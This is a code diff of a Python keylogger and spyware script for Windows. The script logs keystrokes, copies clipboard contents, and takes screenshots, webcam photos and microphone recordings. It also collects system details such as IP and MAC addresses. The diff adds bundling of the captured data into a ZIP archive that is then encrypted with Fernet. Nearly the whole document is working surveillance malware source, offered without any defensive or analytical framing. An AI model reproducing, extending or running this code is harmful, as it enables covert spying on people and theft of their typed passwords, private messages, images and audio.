@@ -1,8 +1,5 @@
-############################################################# IMPORT STATEMENTS #############################################################
-
 import logging
 import requests
-import threading
 import pyaudio
 import win32clipboard
 import time
@@ -16,43 +13,34 @@ import cv2
 import pathlib
 import sounddevice
 import wavio
-
-
-from pynput import keyboard, mouse
+import zipfile
+from pynput import keyboard
 from pynput.keyboard import Key
+from pynput.keyboard import Listener
 from cryptography.fernet import Fernet
 from PIL import ImageGrab
-from scipy.io.wavfile import write as write_rec
-
-
-
-############################################################# INITIALIZATION #############################################################
+from multiprocessing import Process
 
 # Constants
 SCREEN = 'Screenshots'
-WEBCAM= 'WebcamPics'
+WEBCAM = 'WebcamPics'
 LOG_FILE = "keylogfile.txt"
 CLIPBOARD = "clipboard.txt"
-WAVE_OUTPUT_FILENAME = "audiofolder\\"
+WAVE_OUTPUT_FILENAME = "audiofolder"
 ZIP = "test.zip"
 CHUNK = 4096
 FORMAT = pyaudio.paInt32
 CHANNELS = 2
 RATE = 48000
 
-
-#Initialize PyAudio
+# Initialize PyAudio
 audio = pyaudio.PyAudio()
 
-
-############################################################# RETRIEVE INFORMATION #############################################################
-
-#Setup logs files
+# Setup logs files
 def setup_logging():
     logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
 
-
-#Get system information
+# Get system information
 def get_system_info():
     info = {}
     try:
@@ -67,7 +55,7 @@ def get_system_info():
     info['Private IP Address'] = socket.gethostbyname(socket.gethostname())
     info['MAC Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
     info['Processor'] = platform.processor()
-    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB"
+    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 ** 3)))} GB"
 
     return info
 
@@ -78,56 +66,47 @@ def log_system_info():
         logging.info(f"{key}: {value}")
     logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")
 
-
 # Handler for key press event
 def on_press(key):
     logging.info(f"[Key Pressed] - {key}")
 
-
 # Audio Recording
-# Loop that save a picture every 5 seconds
 def Audio():
     pathlib.Path(WAVE_OUTPUT_FILENAME).mkdir(parents=True, exist_ok=True)
-    
-    fs = 44100  # Sampling frequency (samples per second)
-    seconds = 60  # Duration of the audio recording
-    
+    fs = 44100
+    seconds = 20
+
     for x in range(20):
         recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
-        sounddevice.wait()  # Wait for the recording to finish
+        sounddevice.wait()
         output_filename = f'{WAVE_OUTPUT_FILENAME}/mic_recording_{x}.wav'
         wavio.write(output_filename, recording, fs, sampwidth=3)
-
 
 # Capture images from webcam
 def webcam():
     try:
         pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
-        cam_path = 'WebcamPics\\'
+        cam_path = 'WebcamPics/'
         cam = cv2.VideoCapture(0)
         for x in range(20):
             ret, img = cam.read()
-            file = (cam_path + '{}.jpg'.format(x))
+            file = (cam_path + f'{x}.jpg')
             cv2.imwrite(file, img)
             time.sleep(10)
 
-        cam.release()  # Properly release the camera
-        cv2.destroyAllWindows()  # Close OpenCV windows
-
+        cam.release()
+        cv2.destroyAllWindows()
     except Exception as e:
         print("WebcamPics could not be saved: " + str(e))
 
-
 # Monitor clipboard
 def clipboard():
-    previous_clipboard_data = ""  # Store the previous clipboard content
-    
+    previous_clipboard_data = ""
     try:
         win32clipboard.OpenClipboard()
         pasted_data = win32clipboard.GetClipboardData()
         win32clipboard.CloseClipboard()
 
-        # Check if clipboard content has changed
         if pasted_data != previous_clipboard_data:
             with open(CLIPBOARD, "a") as file:
                 file.write("Clipboard Data : \n")
@@ -135,75 +114,87 @@ def clipboard():
                 file.write("\n")
             previous_clipboard_data = pasted_data
 
-            # Add a small delay to avoid high CPU usage
             time.sleep(1)
-
     except Exception as e:
         with open(CLIPBOARD, "a") as file:
             file.write("\n Clipboard could not be copied: " + str(e) + "\n")
-
 
 # Screenshot
 def screenshot():
     try:
         pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
-        screen_path = 'Screenshots\\'
+        screen_path = 'Screenshots/'
 
-        for x in range(0,10):
+        for x in range(0, 10):
             pic = ImageGrab.grab()
-            pic.save(screen_path + 'screenshot{}.png'.format(x))
+            pic.save(screen_path + f'screenshot{x}.png')
             time.sleep(5)
-
     except Exception as e:
         print("Screenshots could not be saved: " + str(e))
 
-def encrypt():
-        files = [LOG_FILE, CLIPBOARD]
+# Function to create a ZIP file with specified files and folders
+def create_zip(files_and_folders, output_zip_file):
+    with zipfile.ZipFile(output_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for item in files_and_folders:
+            if os.path.isdir(item):
+                for root, dirs, files in os.walk(item):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        zipf.write(file_path, os.path.relpath(file_path, item))
+            if os.path.isfile(item):
+                zipf.write(item, os.path.basename(item))
 
-        with open('keyfile.key', 'rb') as keyfile:
-            key = keyfile.read()
+# Function to encrypt the created ZIP file
+def encrypt_zip(zip_file_path):
+    with open('keyfile.key', 'rb') as keyfile:
+        key = keyfile.read()
+    fernet = Fernet(key)
+    with open(zip_file_path, 'rb') as unencrypted_zip:
+        zip_data = unencrypted_zip.read()
+    encrypted_zip_data = fernet.encrypt(zip_data)
+    with open(zip_file_path, 'wb') as encrypted_zip:
+        encrypted_zip.write(encrypted_zip_data)
 
-        for file in files:
-            with open(file, 'rb') as plain_text:
-                data = plain_text.read()
-            encrypted = Fernet(key).encrypt(data)
-
-            with open('e_' + file, 'ab') as hidden_data:    # Appending to the end of the file if it exists
-                hidden_data.write(encrypted)
 
 
-# Main functionv 
 def main():
     try:
-        # Log system information
         setup_logging()
         log_system_info()
         
-        # Création des threads
-        t1 = threading.Thread(target=clipboard)
-        t2 = threading.Thread(target=webcam)
-        t3 = threading.Thread(target=Audio)
-        t4 = threading.Thread(target=screenshot)
-        t5= threading.Thread(target=encrypt)
+        # Create a list of processes for each task
+        processes = []
+        processes.append(Process(target=clipboard))
+        processes.append(Process(target=webcam))
+        processes.append(Process(target=Audio))
+        processes.append(Process(target=screenshot))
+        
+        # Start the processes
+        for process in processes:
+            process.start()
 
-        t1.start()
-        t2.start()
-        t3.start()
-        t4.start()
-        t5.start()
-
-        # Start the keyboard listener to log key presses
-        with keyboard.Listener(on_press=on_press) as key_listener:
-            key_listener.join()
-
-        t1.join()
-        t2.join()
-        t3.join()
-        t4.join()
-        t5.join()
-
+        # Start listening to key presses
+        with Listener(on_press=on_press) as key_listener:
+            # Wait for 20 seconds
+            time.sleep(20)
+        
+        # Terminate the processes
+        for process in processes:
+            process.terminate()
+        
+        # Wait for processes to finish
+        for process in processes:
+            process.join()
+        
+        # Specify files and folders to include in the ZIP
+        files_and_folders = [LOG_FILE, CLIPBOARD, SCREEN, WEBCAM]
+        
+        # Create a ZIP file with the specified files and folders
+        create_zip(files_and_folders, ZIP)
+        
+        # Encrypt the created ZIP file
+        encrypt_zip(ZIP)
      
-
     except Exception as e:
         print(f"An error occurred: {str(e)}")
 
@@ -213,9 +204,10 @@ if __name__ == '__main__':
         if os.path.exists("keyfile.key"):
             main()
         else:
-            print("You forgot to generate the Key x)")
+            print("Vous avez oublié de générer la clé.")
+
     except KeyboardInterrupt:
-        print("Control-C entered... Program exiting")
+        print("La commande Control-C a été entrée... Le programme se termine.")
+    
     except Exception as e:
-        logging.exception(f"An error occurred: {str(e)}")
- 
+        logging.exception(f"Une erreur s'est produite : {str(e)}")
